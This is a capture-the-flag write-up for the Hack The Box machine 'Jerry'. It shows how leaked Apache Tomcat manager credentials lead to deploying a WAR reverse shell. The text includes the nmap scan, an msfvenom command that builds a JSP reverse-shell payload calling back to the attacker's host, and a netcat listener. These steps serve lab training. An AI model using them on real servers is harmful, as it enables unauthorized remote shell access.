# Hack the box - Jerry

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/windows.png"> </span><b>Windows</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.95</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2018 Jun 30</b>

___

## Port scanning
```
nmap -sC -sV -T4 -oA nmap 10.10.10.95
```
![Nmap results](./nmap.png)

There is only port 8080 open which indicates Apache Tomcat server.

___

## Web fingerprinting

By visiting web page we could notice Apache Tomcat server:

![Tomacat index page](./index_page.png)

Manager app have admin access:

![Admin access](./admin_htpasswd.png)

If we press "Cancel", web sever reddirects us to http://10.10.10.95:8080/manager/html page, that have credentials leaked:

![Leaked creds](./leaked_creds.png)

After we successfuly login to admin page, we could identify Deploy location that is iteresting place to inject reverse shell:

![Reverse shell upload location](./reverse_shell_upload_location.png)

## Getting reverse shell

From quick google search we could identify that Apache Tomacat uses java tech stack that supports WAR files:

![Tomcat tech stack](./tomcat_tech_stack.png)

msfvenom is convenient tool to generate reverse shell files:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4444 -f war > reverse_shell.war
```

![Generating reverse shell](./getting_reverse_shell.png)

After we use netcat to listen on port 4444 and upload generated shell:

```
nc -lvnp 4444
```

![File upload](./uploaded_shell.png)

![Got reverse shell](./got_rev_shell.png)

As we can see, there is no need for privelege escalation, so we can capture flags ASAP:

![Capturing flags](./flags_capture.png)